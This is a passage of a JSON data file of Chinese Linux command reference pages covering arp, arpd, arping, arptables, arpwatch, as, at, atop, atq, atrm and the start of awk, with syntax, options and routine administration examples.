class=\"hljs-string\">[root@localhost ~]</span># arp -v\nAddress                  HWtype  HWaddress           Flags Mask            Iface\n<span class=\"hljs-number\">192.168.0.134</span>            ether   <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">21</span>:5E:C7:4D:<span class=\"hljs-number\">88</span>   C                     eth1\n<span class=\"hljs-number\">115.238.144.129</span>          ether   <span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">22</span>:D6:2F:B2:F1   C                     eth0\nEntries: <span class=\"hljs-number\">2</span>      Skipped: <span class=\"hljs-number\">0</span>      Found: <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>添加静态 arp 映射</p>\n<pre><code class=\"language-shell\">arp -s IP MAC-ADDRESS\narp -s <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.1</span> 00<span class=\"hljs-symbol\">:b1</span><span class=\"hljs-symbol\">:b2</span><span class=\"hljs-symbol\">:b3</span><span class=\"hljs-symbol\">:b4</span><span class=\"hljs-symbol\">:b5</span>\n</code></pre>\n<p>删除 arp 缓存条目</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">arp</span> -d <span class=\"hljs-number\">192.168.1.1</span>\n</code></pre>\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "arpd",
        "des": "收集免费ARP信息",
        "body": "<h1 id=\"arpd\">arpd</h1>\n<p>收集免费ARP信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arpd命令</strong> 是用来收集免费arp信息的一个守护进程，它将收集到的信息保存在磁盘上或者在需要时，提供给内核用户用于避免多余广播。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">arpd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：将arp数据库输出到标准输出设备显示并退出；</span>\n<span class=\"hljs-deletion\">-f：指定读取和加载arpd数据库的文本文件，文件的格式与“-l”输出信息类似；</span>\n<span class=\"hljs-deletion\">-b：指定arpd数据库文件，默认的位置为“/var/lib/arpd.db”；</span>\n<span class=\"hljs-deletion\">-a：指定目标被认为死掉前查询的次数；</span>\n<span class=\"hljs-deletion\">-k：禁止通过内核发送广播查询；</span>\n<span class=\"hljs-deletion\">-n：设定缓冲失效时间。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>网络接口：指定网络接口。</p>\n<h3 id=\"实例\">实例</h3>\n<p>启动arpd进程：</p>\n<pre><code class=\"language-shell\">arpd -b <span class=\"hljs-regexp\">/var/</span>tmp/arpd.db\n</code></pre>\n<p>运行一段时间后，查看结果：</p>\n<pre><code class=\"language-shell\">arpd -l -b <span class=\"hljs-regexp\">/var/</span>tmp/arpd.db\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "arping",
        "des": "通过发送ARP协议报文测试网络",
        "body": "<h1 id=\"arping\">arping</h1>\n<p>通过发送ARP协议报文测试网络</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arping命令</strong> 是用于发送arp请求到一个相邻主机的工具，arping使用arp数据包，通过ping命令检查设备上的硬件地址。能够测试一个ip地址是否是在网络上已经被使用，并能够获取更多设备信息。功能类似于ping。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">arping</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：用于发送以太网广播帧（FFFFFFFFFFFF）。arping一开始使用广播地址，在收到响应后就使用unicast地址。</span>\n<span class=\"hljs-deletion\">-q：quiet output不显示任何信息；</span>\n<span class=\"hljs-deletion\">-f：表示在收到第一个响应报文后就退出；</span>\n<span class=\"hljs-deletion\">-w timeout：设定一个超时时间，单位是秒。如果到了指定时间，arping还没到完全收到响应则退出；</span>\n<span class=\"hljs-deletion\">-c count：表示发送指定数量的ARP请求数据包后就停止。如果指定了deadline选项，则arping会等待相同数量的arp响应包，直到超时为止；</span>\n<span class=\"hljs-deletion\">-s source：设定arping发送的arp数据包中的SPA字段的值。如果为空，则按下面处理，如果是DAD模式（冲突地址探测），则设置为0.0.0.0，如果是Unsolicited ARP模式（Gratutious ARP）则设置为目标地址，否则从路由表得出；</span>\n<span class=\"hljs-deletion\">-I interface：设置ping使用的网络接口。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目的主机：指定发送ARP报文的目的主机。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># arping www.baidu.com </span>\nARPING <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> from <span class=\"hljs-number\">173.231</span>.<span class=\"hljs-number\">43.132</span> eth0\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> 00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:</span>[<span class=\"hljs-symbol\">bc:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.666</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.677</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.691</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.728</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.626</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.292</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">1.429</span>ms\nUnicast reply from <span class=\"hljs-number\">220.181</span>.<span class=\"hljs-number\">111.147</span> [00<span class=\"hljs-symbol\">:D0</span><span class=\"hljs-symbol\">:</span>03<span class=\"hljs-symbol\">:BC</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">48</span><span class=\"hljs-symbol\">:</span>00]  <span class=\"hljs-number\">2.042</span>ms\nSent <span class=\"hljs-number\">8</span> probes (<span class=\"hljs-number\">1</span> broadcast(s))\nReceived <span class=\"hljs-number\">8</span> response(s)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "arptables",
        "des": "管理ARP包过滤规则表",
        "body": "<h1 id=\"arptables\">arptables</h1>\n<p>管理ARP包过滤规则表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arptables命令</strong> 用来设置、维护和检查Linux内核中的arp包过滤规则表。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">arptables</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：向规则链中追加规则；</span>\n<span class=\"hljs-deletion\">-D：从指定的链中删除规则；</span>\n<span class=\"hljs-deletion\">-l：向规则链中插入一条新的规则；</span>\n<span class=\"hljs-deletion\">-R：替换指定规则；</span>\n<span class=\"hljs-deletion\">-P：设置规则链的默认策略；</span>\n<span class=\"hljs-deletion\">-F：刷新指定规则链，将其中的所有规则链删除，但是不改变规则链的默认策略；</span>\n<span class=\"hljs-deletion\">-Z：将规则链计数器清零；</span>\n<span class=\"hljs-deletion\">-L：显示规则链中的规则列表；</span>\n<span class=\"hljs-deletion\">-X：删除指定的空用户自定义规则链；</span>\n<span class=\"hljs-deletion\">-h：显示指令帮助信息；</span>\n<span class=\"hljs-deletion\">-j：指定满足规则的添加时的目标；</span>\n<span class=\"hljs-deletion\">-s：指定要匹配ARP包的源ip地址；</span>\n<span class=\"hljs-deletion\">-d：指定要匹配ARP包的目的IP地址。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "arpwatch",
        "des": "监听网络上ARP的记录",
        "body": "<h1 id=\"arpwatch\">arpwatch</h1>\n<p>监听网络上ARP的记录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arpwatch命令</strong> 用来监听网络上arp的记录。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">arpwatch</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：启动排错模式；</span>\n<span class=\"hljs-deletion\">-f&lt;记录文件&gt;：设置存储ARP记录的文件，预设为/var/arpwatch/arp.dat；</span>\n<span class=\"hljs-deletion\">-i&lt;接口&gt;：指定监听ARP的接口，预设的接口为eth0；</span>\n<span class=\"hljs-deletion\">-r&lt;记录文件&gt;：从指定的文件中读取ARP记录，而不是从网络上监听。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "as",
        "des": "汇编语言编译器",
        "body": "<h1 id=\"as\">as</h1>\n<p>汇编语言编译器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>as命令</strong> GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">as</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-ac：忽略失败条件；</span>\n<span class=\"hljs-deletion\">-ad：忽略调试指令；</span>\n<span class=\"hljs-deletion\">-ah：包括高级源；</span>\n<span class=\"hljs-deletion\">-al：包括装配；</span>\n<span class=\"hljs-deletion\">-am：包括宏扩展；</span>\n<span class=\"hljs-deletion\">-an：忽略形式处理；</span>\n<span class=\"hljs-deletion\">-as：包括符号；</span>\n=file：设置列出文件的名字；\n<span class=\"hljs-deletion\">--alternate：以交互宏模式开始；</span>\n<span class=\"hljs-deletion\">-f：跳过空白和注释预处理；</span>\n<span class=\"hljs-deletion\">-g：产生调试信息；</span>\n<span class=\"hljs-deletion\">-J：对于有符号溢出不显示警告信息；</span>\n<span class=\"hljs-deletion\">-L：在符号表中保留本地符号；</span>\n<span class=\"hljs-deletion\">-o：指定要生成的目标文件；</span>\n<span class=\"hljs-deletion\">--statistics：打印汇编所用的最大空间和总时间。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>汇编文件：指定要汇编的源文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "at",
        "des": "在指定时间执行一个任务",
        "body": "<h1 id=\"at\">at</h1>\n<p>在指定时间执行一个任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>at命令</strong> 用于在指定时间执行命令。at允许使用一套相当复杂的指定时间的方法。它能够接受在当天的hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的&nbsp;词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上AM（上午）或PM（下午）来说明是上午还是下午。&nbsp;也能够指定命令执行的具体日期，指定格式为month&nbsp;day（月&nbsp;日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。</p>\n<p>上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：<code>now&nbsp;+&nbsp;count&nbsp;time-units</code>，now就是当前时间，time-units是时间单位，这里能够是minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count是时间的数量，究竟是几天，还是几小时，等等。&nbsp;更有一种计时方法就是直接使用today（今天）、tomorrow（明天）来指定完成命令的时间。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">at <span class=\"hljs-selector-attr\">[-V]</span> <span class=\"hljs-selector-attr\">[-q 队列]</span> <span class=\"hljs-selector-attr\">[-f 文件]</span> <span class=\"hljs-selector-attr\">[-mldbv]</span> 时间 at -c 作业 <span class=\"hljs-selector-attr\">[作业...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：指定包含具体指令的任务文件；</span>\n<span class=\"hljs-deletion\">-q：指定新任务的队列名称；</span>\n<span class=\"hljs-deletion\">-l：显示待执行任务的列表；</span>\n<span class=\"hljs-deletion\">-d：删除指定的待执行任务；</span>\n<span class=\"hljs-deletion\">-m：任务执行完成后向用户发送E-mail。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>日期时间：指定任务执行的日期时间。</p>\n<h3 id=\"实例\">实例</h3>\n<p>三天后的下午&nbsp;5&nbsp;点锺执行<code>/bin/ls</code>：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">5</span>pm+<span class=\"hljs-number\">3</span> days\n<span class=\"hljs-keyword\">at</span>&gt; /bin/ls\n<span class=\"hljs-keyword\">at</span>&gt; &lt;EOT&gt;\njob <span class=\"hljs-number\">7</span> <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2013</span>-<span class=\"hljs-number\">01</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span>\n</code></pre>\n<p>明天17点钟，输出时间到指定文件内：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># at 17:20 tomorrow</span>\n<span class=\"hljs-keyword\">at</span>&gt; <span class=\"hljs-built_in\">date</span> &gt;/root/<span class=\"hljs-number\">2013.</span><span class=\"hljs-built_in\">log</span>\n<span class=\"hljs-keyword\">at</span>&gt; &lt;EOT&gt;\njob <span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2013</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-06</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">20</span>\n</code></pre>\n<p>计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# atq\n8       2013<span class=\"hljs-string\">-01</span><span class=\"hljs-string\">-06</span> 17:20 a root\n7       2013<span class=\"hljs-string\">-01</span><span class=\"hljs-string\">-08</span> 17:00 a root\n</code></pre>\n<p>删除已经设置的任务：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># atq</span>\n<span class=\"hljs-number\">8</span>       <span class=\"hljs-number\">2013</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-06</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">20</span> a root\n<span class=\"hljs-number\">7</span>       <span class=\"hljs-number\">2013</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-08</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span> a root\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># atrm 7</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># atq</span>\n<span class=\"hljs-number\">8</span>       <span class=\"hljs-number\">2013</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-06</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">20</span> a root\n</code></pre>\n<p>显示已经设置的任务内容：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># at -c 8</span>\n<span class=\"hljs-comment\">#!/bin/sh</span>\n<span class=\"hljs-comment\"># atrun uid=0 gid=0</span>\n<span class=\"hljs-comment\"># mail     root 0</span>\n<span class=\"hljs-keyword\">umask</span> <span class=\"hljs-number\">22</span>此处省略n个字符\ndate &gt;<span class=\"hljs-regexp\">/root/</span><span class=\"hljs-number\">2013</span>.log\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "atop",
        "des": "监控Linux系统资源与进程的工具",
        "body": "<h1 id=\"atop\">atop</h1>\n<p>监控Linux系统资源与进程的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>[非内部程序，需要安装]它以一定的频率记录系统的运行状态，所采集的数据包含系统资源(CPU、内存、磁盘和网络)使用情况和进程运行情况，并能以日志文件的方式保存在磁盘中，服务器出现问题后，我们可获取相应的atop日志文件进行分析。atop是一款开源软件，我们可以从这里获得其源码和rpm安装包。</p>\n<h2 id=\"语法\">语法</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">atop</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h2 id=\"说明\">说明</h2>\n<p><strong>ATOP列</strong>：该列显示了主机名、信息采样日期和时间点</p>\n<p><strong>PRC列</strong>：该列显示进程整体运行情况</p>\n<ul>\n<li>sys、usr字段分别指示进程在内核态和用户态的运行时间</li>\n<li>#proc字段指示进程总数</li>\n<li>#zombie字段指示僵死进程的数量</li>\n<li>#exit字段指示atop采样周期期间退出的进程数量</li>\n</ul>\n<p><strong>CPU列</strong>：该列显示CPU整体(即多核CPU作为一个整体CPU资源)的使用情况，我们知道CPU可被用于执行进程、处理中断，也可处于空闲状态(空闲状态分两种，一种是活动进程等待磁盘IO导致CPU空闲，另一种是完全空闲)</p>\n<ul>\n<li>sys、usr字段指示CPU被用于处理进程时，进程在内核态、用户态所占CPU的时间比例</li>\n<li>irq字段指示CPU被用于处理中断的时间比例</li>\n<li>idle字段指示CPU处在完全空闲状态的时间比例</li>\n<li>wait字段指示CPU处在“进程等待磁盘IO导致CPU空闲”状态的时间比例</li>\n</ul>\n<p>CPU列各个字段指示值相加结果为N00%，其中N为cpu核数。</p>\n<p>cpu列：该列显示某一核cpu的使用情况，各字段含义可参照CPU列，各字段值相加结果为100%</p>\n<p><strong>CPL列</strong>：该列显示CPU负载情况</p>\n<ul>\n<li>avg1、avg5和avg15字段：过去1分钟、5分钟和15分钟内运行队列中的平均进程数量</li>\n<li>csw字段指示上下文交换次数</li>\n<li>intr字段指示中断发生次数</li>\n</ul>\n<p><strong>MEM列</strong>：该列指示内存的使用情况</p>\n<ul>\n<li>tot字段指示物理内存总量</li>\n<li>free字段指示空闲内存的大小</li>\n<li>cache字段指示用于页缓存的内存大小</li>\n<li>buff字段指示用于文件缓存的内存大小</li>\n<li>slab字段指示系统内核占用的内存大小</li>\n</ul>\n<p><strong>SWP列</strong>：该列指示交换空间的使用情况</p>\n<ul>\n<li>tot字段指示交换区总量</li>\n<li>free字段指示空闲交换空间大小</li>\n</ul>\n<p><strong>PAG列</strong>：该列指示虚拟内存分页情况</p>\n<p>swin、swout字段：换入和换出内存页数</p>\n<p><strong>DSK列</strong>：该列指示磁盘使用情况，每一个磁盘设备对应一列，如果有sdb设备，那么增多一列DSK信息</p>\n<ul>\n<li>sda字段：磁盘设备标识</li>\n<li>busy字段：磁盘忙时比例</li>\n<li>read、write字段：读、写请求数量</li>\n</ul>\n<p><strong>NET列</strong>：多列NET展示了网络状况，包括传输层(TCP和UDP)、IP层以及各活动的网口信息</p>\n<ul>\n<li>XXXi  字段指示各层或活动网口收包数目</li>\n<li>XXXo 字段指示各层或活动网口发包数目</li>\n</ul>\n<h2 id=\"atop日志\">atop日志</h2>\n<p>每个时间点采样页面组合起来就形成了一个atop日志文件，我们可以使用\"atop -r XXX\"命令对日志文件进行查看。那以什么形式保存atop日志文件呢？</p>\n<p>对于atop日志文件的保存方式，我们可以这样：</p>\n<ul>\n<li>每天保存一个atop日志文件，该日志文件记录当天信息</li>\n<li>日志文件以\"atop_YYYYMMDD\"的方式命名</li>\n<li>设定日志失效期限，自动删除一段时间前的日志文件</li>\n</ul>\n<p>其实atop开发者已经提供了以上日志保存方式，相应的atop.daily脚本可以在源码目录下找到。在atop.daily脚本中，我们可以通过修改INTERVAL变量改变atop信息采样周期(默认为10分钟)；通过修改以下命令中的数值改变日志保存天数(默认为28天)：</p>\n<pre><code class=\"language-shell\">(<span class=\"hljs-built_in\">sleep</span> <span class=\"hljs-number\">3</span>; <span class=\"hljs-built_in\">find</span> $LOGPATH -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">'atop_*'</span> -mtime +<span class=\"hljs-number\">28</span> -<span class=\"hljs-built_in\">exec</span> rm {} \\; )&amp; \n</code></pre>\n<p>最后，我们修改cron文件，每天凌晨执行atop.daily脚本：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">0 </span><span class=\"hljs-number\">0</span> * * * root /etc/cron.daily/atop.daily\n</code></pre>\n<h2 id=\"相关资料\">相关资料</h2>\n<ul>\n<li><a href=\"http://www.atoptool.nl/download/man_atop-1.pdf\">官方手册</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "atq",
        "des": "列出当前用户的at任务列表",
        "body": "<h1 id=\"atq\">atq</h1>\n<p>列出当前用户的at任务列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>atq命令</strong> 显示系统中待执行的任务列表，也就是列出当前用户的at任务列表。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">at<span class=\"hljs-string\">q [-V]</span> [-<span class=\"hljs-keyword\">q</span> 队列] [-v]\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-V：显示版本号；</span>\n<span class=\"hljs-deletion\">-q：查询指定队列的任务。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">at</span> now + <span class=\"hljs-number\">10</span> minutes\n<span class=\"hljs-attribute\">at</span>&gt; echo <span class=\"hljs-number\">1111</span>\n<span class=\"hljs-attribute\">at</span>&gt; &lt;eot&gt;\n<span class=\"hljs-attribute\">job</span> <span class=\"hljs-number\">3</span> at Fri Apr <span class=\"hljs-number\">26</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">2013</span>\n\n<span class=\"hljs-attribute\">atq</span>\n<span class=\"hljs-attribute\">3</span>       Fri Apr <span class=\"hljs-number\">26</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">2013</span> a root\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "atrm",
        "des": "删除待执行任务队列中的指定任务",
        "body": "<h1 id=\"atrm\">atrm</h1>\n<p>删除待执行任务队列中的指定任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>atrm命令</strong> 用于删除待执行任务队列中的指定任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">atrm</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-V：显示版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>任务号：指定待执行队列中要删除的任务。</p>\n<h3 id=\"实例\">实例</h3>\n<p>删除已经排队的任务</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">atq</span>        # 显示当前已经设置的任务\n<span class=\"hljs-attribute\">2</span> Mon May <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">2010</span> a root\n<span class=\"hljs-attribute\">1</span> Sat May <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">2010</span> a root\n\n<span class=\"hljs-attribute\">atrm</span> <span class=\"hljs-number\">2</span>     # 删除任务<span class=\"hljs-number\">2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "awk",
        "des": "文本和数据进行处理的编程语言",
        "body": "<h1 id=\"awk\">awk</h1>\n<p>文本和数据进行处理的编程语言</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>awk</strong> 是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。</p>\n<h2 id=\"awk命令格式和选项\">awk命令格式和选项</h2>\n<p><strong>语法形式</strong> </p>\n<pre><code class=\"language-shell\">awk [options] <span class=\"hljs-string\">'script'</span> <span class=\"hljs-keyword\">var</span>=value <span class=\"hljs-keyword\">file</span>(s)\nawk [options] -f scriptfile <span class=\"hljs-keyword\">var</span>=value <span class=\"hljs-keyword\">file</span>(s)\n</code></pre>\n<p><strong>常用命令选项</strong> </p>\n<ul>\n<li> <strong>-F fs</strong> fs指定输入分隔符，fs可以是字符串或正则表达式，如-F:，默认的分隔符是连续的空格或制表符</li>\n<li> <strong>-v var=value</strong> 赋值一个用户定义变量，将外部变量传递给awk</li>\n<li> <strong>-f scripfile</strong> 从脚本文件中读取awk命令</li>\n<li> <strong>-m[fr] val</strong> 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。</li>\n</ul>\n<h2 id=\"awk模式和操作\">awk模式和操作</h2>\n<p>awk脚本是由模式和操作组成的。</p>\n<h3 id=\"模式\">模式</h3>\n<p>模式可以是以下任意一个：</p>\n<ul>\n<li>/正则表达式/：使用通配符的扩展集。</li>\n<li>关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。</li>\n<li>模式匹配表达式：用运算符<code>~</code>（匹配）和<code>!~</code>（不匹配）。</li>\n<li>BEGIN语句块、pattern语句块、END语句块：参见awk的工作原理</li>\n</ul>\n<h3 id=\"操作\">操作</h3>\n<p>操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是：</p>\n<ul>\n<li>变量或数组赋值</li>\n<li>输出命令</li>\n<li>内置函数</li>\n<li>控制流语句</li>\n</ul>\n<h2 id=\"awk脚本基本结构\">awk脚本基本结构</h2>\n<pre><code class=\"language-shell\">awk 'BEGIN{ <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"start\"</span> } pattern{ commands } END{ <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"end\"</span> }' <span class=\"hljs-keyword\">file</span>\n</code></pre>\n<p>一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被 <strong>单引号</strong> 或 <strong>双引号</strong> 中，例如：</p>\n<pre><code class=\"language-shell\"><span class=\"language-xml\">awk 'BEGIN</span><span class=\"hljs-template-variable\">{ i=0 }</span><span class=\"language-xml\"> </span><span class=\"hljs-template-variable\">{ i++ }</span><span class=\"language-xml\"> END</span><span class=\"hljs-template-variable\">{ print i }</span><span class=\"language-xml\">' filename\nawk \"BEGIN</span><span class=\"hljs-template-variable\">{ 